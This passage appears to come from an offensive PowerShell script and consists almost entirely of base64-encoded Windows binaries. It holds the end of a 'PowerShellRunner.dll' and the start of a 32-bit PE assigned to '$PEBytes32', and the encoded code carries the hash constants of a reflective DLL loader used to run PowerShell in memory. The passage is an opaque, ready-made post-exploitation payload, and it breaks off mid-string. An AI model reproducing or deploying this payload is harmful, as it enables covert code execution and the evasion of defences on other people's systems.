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6KAIoSihSKGIoaChqKGwobihwKHQodih4KHoofCh+KEAogiiEKIYoiCiKKI4okCiSKJQoliiYKJoonCieKKAooiimKKgoqiisKK4osCiyKLQotii4KL4ohCjMKNgowAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
    $PEBytes32 = "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